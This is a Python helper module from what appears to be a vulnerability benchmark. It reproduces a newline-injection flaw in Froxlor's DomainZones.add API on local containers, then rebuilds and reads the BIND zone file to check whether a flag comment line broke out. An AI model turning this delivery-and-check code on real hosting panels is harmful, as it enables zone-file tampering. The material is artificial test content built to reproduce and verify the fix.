#!/usr/bin/env python3
"""Shared plumbing for froxlor-cve-2026-41234 (DomainZones.add newline injection).

The customer API key (pcbkey:pcbsecret, created by the entrypoint via the REAL api_keys
table) calls `DomainZones.add` on the REAL Froxlor JSON-RPC-ish API (POST api.php with HTTP
Basic auth). The injected content carries a BIND zone-file comment line `; pcb_<FLAG>`.
The oracle then runs the REAL froxlor DNS-rebuild cron (`bin/froxlor-cli froxlor:cron -r 4`)
inside the container and reads the generated zone file /etc/bind/domains/pcb.local.zone.

The returned `body` contains ONLY the zone file's comment lines (lines starting with ';'),
so the flag token appears in the observation iff the newline injection actually broke out
of the record line (seed@V0, residual@V1) and disappears when the record content is
sanitized to a single line (residual@V2).
"""
import base64
import json
import os
import subprocess
import urllib.request
import urllib.error

FLAG = "pcbflag"  # injected by oracle
APP_HOST = {"v0": 41820, "v1": 41821, "v2": 41822}
APP_SVC = {"v0": "v0", "v1": "v1", "v2": "v2"}


def _app_port(version):
    shared = os.environ.get("PCB_APP_PORT") or os.environ.get("PCB_TARGET_PORT")
    if shared and str(shared).isdigit():
        return int(shared)
    return {"v0": int(os.environ.get("PORT_V0_0", "41820")),
            "v1": int(os.environ.get("PORT_V1_0", "41821")),
            "v2": int(os.environ.get("PORT_V2_0", "41822"))}[version]


def _container(version):
    env = os.environ.get("PCB_CONTAINER")
    if env:
        return env
    return {"v0": "pcb-froxlor-dns-v0", "v1": "pcb-froxlor-dns-v1", "v2": "pcb-froxlor-dns-v2"}[version]
API_KEY = "pcbkey"
API_SECRET = "pcbsecret"
DOMAIN = "pcb.local"
ZONE_FILE = "/etc/bind/domains/pcb.local.zone"


def api_add(version, type_, content):
    """POST api.php -> DomainZones.add with the given content. Returns (http_status, body)."""
    port = _app_port(version)
    payload = json.dumps({
        "command": "DomainZones.add",
        "params": {"domainname": DOMAIN, "record": "@", "type": type_, "content": content},
    }).encode()
    auth = base64.b64encode(f"{API_KEY}:{API_SECRET}".encode()).decode()
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/api.php", data=payload, method="POST",
        headers={"Content-Type": "application/json", "Authorization": f"Basic {auth}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def docker_exec(version, *args):
    """docker exec <container> <args...>"""
    return subprocess.run(
        ["docker", "exec", _container(version), *args],
        capture_output=True, text=True, timeout=120,
    )


def rebuild_dns(version):
    """Run the REAL froxlor DNS rebuild cron inside the container."""
    r = docker_exec(version, "php", "/var/www/html/bin/froxlor-cli", "froxlor:cron", "-r", "4", "--force")
    return r.returncode


def read_zone(version):
    """Read the generated BIND zone file for pcb.local."""
    r = docker_exec(version, "cat", ZONE_FILE)
    if r.returncode != 0:
        return ""
    return r.stdout


def probe(version, type_, content, flag):
    """Add a DNS record with newline-injected content, rebuild the zone, observe.

    Returns a result dict whose only flag-bearing field is `body` (the zone file's
    comment lines). This keeps the strict gate honest: on V2 the flag token survives in
    the TXT *value* but never becomes a standalone zone line, so it is not observable.
    """
    status, api_body = api_add(version, type_, content)
    rebuild_dns(version)
    zone = read_zone(version)
    comments = "\n".join(
        line for line in zone.splitlines() if line.lstrip().startswith(";")
    )
    return {
        "ok": flag in comments,
        "status": status,
        "body": comments,
        "api_body": api_body[:160],
        "zone_len": len(zone),
    }
